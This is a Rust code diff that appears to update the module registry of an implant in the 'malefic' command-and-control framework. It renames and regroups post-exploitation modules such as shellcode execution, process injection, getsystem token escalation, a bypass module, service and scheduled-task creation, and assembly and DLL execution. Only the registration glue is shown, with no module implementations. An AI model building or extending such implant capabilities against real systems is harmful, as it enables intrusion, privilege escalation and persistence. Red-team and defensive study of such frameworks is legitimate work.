@@ -8,11 +8,12 @@ pub mod sys;
 pub mod execute;
 
 use async_trait::async_trait;
-use malefic_helper::protobuf::implantpb;
-use malefic_helper::protobuf::implantpb::spite::Body;
-use malefic_helper::protobuf::implantpb::Status;
+use malefic_proto::proto::{implantpb, modulepb};
+use malefic_proto::proto::implantpb::spite::Body;
+use malefic_proto::proto::implantpb::Status;
 use std::collections::HashMap;
 use thiserror::Error;
+
 pub type MaleficModule = dyn Module + Send + Sync + 'static;
 pub type Output = async_std::channel::Sender<TaskResult>;
 pub type Input = async_std::channel::Receiver<Body>;
@@ -22,7 +23,7 @@ pub type Result = anyhow::Result<TaskResult>;
 pub enum TaskError {
     #[error(transparent)]
     OperatorError(#[from] anyhow::Error),
-
+    
     #[error("")]
     NotExpectBody,
 
@@ -52,7 +53,8 @@ impl TaskError {
     }
 }
 
-#[derive(Clone, Debug)]
+#[cfg_attr(debug_assertions, derive(Debug))]
+#[derive(Clone)]
 pub struct TaskResult {
     pub task_id: u32,
     pub body: Body,
@@ -63,12 +65,12 @@ impl TaskResult {
     fn new(task_id: u32) -> Self {
         TaskResult {
             task_id,
-            body: Body::Empty(Default::default()), // 直接使用传入的Body实例
             status: Status {
                 task_id,
                 status: 0,
                 error: String::default(),
             },
+            body: Body::Empty(Default::default()),
         }
     }
 
@@ -92,7 +94,7 @@ impl TaskResult {
                 status: 0,
                 error: String::default(),
             },
-            body: Body::Ack(implantpb::Ack {
+            body: Body::Ack(modulepb::Ack {
                 id,
                 success: true,
                 end: false,
@@ -103,7 +105,7 @@ impl TaskResult {
     pub fn new_with_error(task_id: u32, task_error: TaskError) -> Self {
         TaskResult {
             task_id,
-            body: Body::Empty(Default::default()), // 直接使用传入的Body实例
+            body: Body::Empty(Default::default()), 
             status: Status {
                 task_id,
                 status: task_error.id(), // module error
@@ -147,94 +149,75 @@ pub trait Module {
 pub extern "C" fn register_modules() -> HashMap<String, Box<MaleficModule>> {
     let mut map: HashMap<String, Box<MaleficModule>> = HashMap::new();
 
-    // if cfg!(debug_assertions) {
-    //     map.insert(misc::example::Example::name().to_string(), Box::new(misc::example::Example::new()));
-    // }
+    #[cfg(debug_assertions)]
+    map.insert(sys::example::Example::name().to_string(), Box::new(sys::example::Example::new()));
 
-    // fs
-    #[cfg(feature = "fs")]
+    register_module!(map, "pwd", fs::pwd::Pwd);
+    register_module!(map, "cd", fs::cd::Cd);
+    register_module!(map, "ls", fs::ls::Ls);
+    register_module!(map, "rm", fs::rm::Rm);
+    register_module!(map, "mv", fs::mv::Mv);
+    register_module!(map, "cp", fs::cp::Cp);
+    register_module!(map, "mkdir", fs::mkdir::Mkdir);
+    register_module!(map, "cat", fs::cat::Cat);
+
+    register_module!(map, "upload", net::upload::Upload);
+    register_module!(map, "download", net::download::Download);
+
+    register_module!(map, "exec", execute::exec::Exec);
+    register_module!(map,"execute_shellcode",execute::execute_shellcode::ExecuteShellcode);
+    register_module!(map, "kill", sys::kill::Kill);
+    register_module!(map, "whoami", sys::whoami::Whoami);
+    register_module!(map, "env", sys::env::Env);
+    register_module!(map, "env", sys::env::Setenv);
+    register_module!(map, "env", sys::env::Unsetenv);
+    register_module!(map, "ps", sys::ps::Ps);
+    register_module!(map, "netstat", sys::netstat::Netstat);
+    register_module!(map, "info", sys::info::SysInfo);
+
+    #[cfg(target_family = "unix")]
     {
-        register_module!(map, "fs_pwd", fs::pwd::Pwd);
-        register_module!(map, "fs_cd", fs::cd::Cd);
-        register_module!(map, "fs_ls", fs::ls::Ls);
-        register_module!(map, "fs_rm", fs::rm::Rm);
-        register_module!(map, "fs_mv", fs::mv::Mv);
-        register_module!(map, "fs_cp", fs::cp::Cp);
-        register_module!(map, "fs_mkdir", fs::mkdir::Mkdir);
-        register_module!(map, "fs_cat", fs::cat::Cat);
-
-        #[cfg(target_family = "unix")]
-        register_module!(map, "fs_chmod", fs::chmod::Chmod);
-        #[cfg(target_family = "unix")]
-        register_module!(map, "fs_chown", fs::chown::Chown);
+        register_module!(map, "chmod", fs::chmod::Chmod);
+        register_module!(map, "chown", fs::chown::Chown);
     }
-    #[cfg(feature = "net")]
+    
+    #[cfg(target_os = "windows")]
     {
-        register_module!(map, "net_upload", net::upload::Upload);
-        register_module!(map, "net_download", net::download::Download);
-        // register_module!(map, "net_curl", net::curl::Curl);
-    }
-    #[cfg(feature = "sys")]
-    {
-        register_module!(map, "execute_exec", execute::exec::Exec);
-        register_module!(
-            map,
-            "execute_shellcode",
-            execute::execute_shellcode::ExecuteShellcode
-        );
-        register_module!(map, "sys_kill", sys::kill::Kill);
-        register_module!(map, "sys_whoami", sys::whoami::Whoami);
-        register_module!(map, "sys_env", sys::env::Env);
-        register_module!(map, "sys_env", sys::env::Setenv);
-        register_module!(map, "sys_env", sys::env::Unsetenv);
-        register_module!(map, "sys_ps", sys::ps::Ps);
-        register_module!(map, "sys_netstat", sys::netstat::Netstat);
-        register_module!(map, "sys_info", sys::info::SysInfo);
+        register_module!(map, "wmi", sys::wmi::WmiQuery);
+        register_module!(map, "wmi", sys::wmi::WmiExecuteMethod);
+        register_module!(map, "service", sys::service::ServiceList);
+        register_module!(map, "service", sys::service::ServiceStart);
+        register_module!(map, "service", sys::service::ServiceStop);
+        register_module!(map, "service", sys::service::ServiceDelete);
+        register_module!(map, "service", sys::service::ServiceQuery);
+        register_module!(map, "service", sys::service::ServiceCreate);
+        register_module!(map, "taskschd", sys::taskschd::TaskSchdList);
+        register_module!(map, "taskschd", sys::taskschd::TaskSchdCreate);
+        register_module!(map, "taskschd", sys::taskschd::TaskSchdDelete);
+        register_module!(map, "taskschd", sys::taskschd::TaskSchdStart);
+        register_module!(map, "taskschd", sys::taskschd::TaskSchdStop);
+        register_module!(map, "registry", sys::reg::RegQuery);
+        register_module!(map, "registry", sys::reg::RegAdd);
+        register_module!(map, "registry", sys::reg::RegDelete);
+        register_module!(map, "registry", sys::reg::RegListKey);
+        register_module!(map, "registry", sys::reg::RegListValue);
+        register_module!(map, "bypass", sys::bypass::Bypass);
+        register_module!(map, "inject", sys::inject::Inject);
+        register_module!(map, "runas", sys::token::RunAs);
+        register_module!(map, "privs", sys::token::GetPriv);
+        register_module!(map, "getsystem", sys::token::GetSystem);
 
-        #[cfg(target_os = "windows")]
-        {
-            register_module!(map, "sys_bypass", sys::bypass::Bypass);
-            register_module!(map, "execute_bof", execute::execute_bof::ExecuteBof);
-            register_module!(
-                map,
-                "execute_assembly",
-                execute::execute_assemble::ExecuteAssembly
-            );
-            register_module!(
-                map,
-                "execute_powershell",
-                execute::execute_powershell::ExecutePowershell
-            );
-            register_module!(
-                map,
-                "execute_armory",
-                execute::execute_armory::ExecuteArmory
-            );
-            register_module!(map, "execute_exe", execute::execute_exe::ExecuteExe);
-            register_module!(map, "execute_dll", execute::execute_dll::ExecuteDll);
-            register_module!(map, "execute_local", execute::execute_local::ExecuteLocal);
-            // register_module!(map, "sys_execute_pe", sys::execute_pe::ExecutePE);
-        }
+        register_module!(map, "pipe", fs::pipe::PipeClose);
+        register_module!(map, "pipe", fs::pipe::PipeRead);
+        register_module!(map, "pipe", fs::pipe::PipeUpload);
+        
+        register_module!(map, "execute_bof", execute::execute_bof::ExecuteBof);
+        register_module!(map, "execute_assembly",execute::execute_assemble::ExecuteAssembly);
+        register_module!(map, "execute_powershell",execute::execute_powershell::ExecutePowershell);
+        register_module!(map, "execute_armory",execute::execute_armory::ExecuteArmory);
+        register_module!(map, "execute_exe", execute::execute_exe::ExecuteExe);
+        register_module!(map, "execute_dll", execute::execute_dll::ExecuteDll);
+        register_module!(map, "execute_local", execute::execute_local::ExecuteLocal);
     }
     map
 }
-
-// #[cfg(target_os = "windows")]
-// #[cfg(feature = "community")]
-// #[link(name = "malefic_win_kit", kind = "dylib")]
-// extern "C" {
-//     fn MaleficLoadLibrary(
-//         flags: u32,
-//         buffer: winapi::shared::ntdef::LPCWSTR,
-//         file_buffer: *const core::ffi::c_void,
-//         len: usize,
-//         name: *const u8,
-//     ) -> *const core::ffi::c_void;
-// }
-
-// #[cfg(target_os = "windows")]
-// #[cfg(feature = "community")]
-// pub const LOAD_MEMORY: u16 = 0x02u16;
-// #[cfg(target_os = "windows")]
-// #[cfg(feature = "community")]
-// pub const AUTO_RUN_DLL_MAIN: u32 = 0x00010000u32;
